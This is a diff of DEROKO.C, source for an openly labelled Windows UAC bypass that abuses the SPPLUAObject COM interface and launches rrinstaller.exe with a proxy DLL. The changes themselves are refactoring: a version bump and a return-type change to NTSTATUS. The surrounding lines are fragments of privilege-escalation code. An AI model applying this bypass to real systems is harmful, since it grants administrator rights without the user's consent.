@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2016 - 2018
+*  (C) COPYRIGHT AUTHORS, 2016 - 2019
 *
 *  TITLE:       DEROKO.C
 *
-*  VERSION:     3.11
+*  VERSION:     3.17
 *
-*  DATE:        23 Nov 2018
+*  DATE:        18 Mar 2019
 *
 *  Deroko UAC bypass using SPPLUAObject (Software Licensing).
 *  Origin https://github.com/deroko/SPPLUAObjectUacBypass
@@ -94,12 +94,12 @@ HRESULT ucmSPLUAObjectRegSetValue(
 * Fixed in Windows 10 RS5.
 *
 */
-BOOL ucmSPPLUAObjectMethod(
+NTSTATUS ucmSPPLUAObjectMethod(
     _In_ PVOID ProxyDll,
     _In_ DWORD ProxyDllSize
 )
 {
-    BOOL      bResult = FALSE, bCond = FALSE;
+    NTSTATUS  MethodResult = STATUS_ACCESS_DENIED;
     HRESULT   r = E_FAIL, hr_init;
     ISLLUACOM *SPPLUAObject = NULL;
 
@@ -110,7 +110,7 @@ BOOL ucmSPPLUAObjectMethod(
 
     WCHAR     szBuffer[MAX_PATH * 2];
     LPWSTR    lpszCommandLine;
-    
+
     hr_init = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
 
     do {
@@ -207,14 +207,15 @@ BOOL ucmSPPLUAObjectMethod(
                         //
                         _strcpy(szBuffer, g_ctx->szSystemDirectory);
                         _strcat(szBuffer, RRINSTALLER_EXE);
-                        bResult = supRunProcess(szBuffer, NULL);
+                        if (supRunProcess(szBuffer, NULL))
+                            MethodResult = STATUS_SUCCESS;
                     }
                 }
             }
             supHeapFree(lpszCommandLine);
         }
 
-    } while (bCond);
+    } while (FALSE);
 
     if (SPPLUAObject != NULL) {
         SPPLUAObject->lpVtbl->Release(SPPLUAObject);
@@ -223,5 +224,5 @@ BOOL ucmSPPLUAObjectMethod(
     if (hr_init == S_OK)
         CoUninitialize();
 
-    return bResult;
+    return MethodResult;
 }
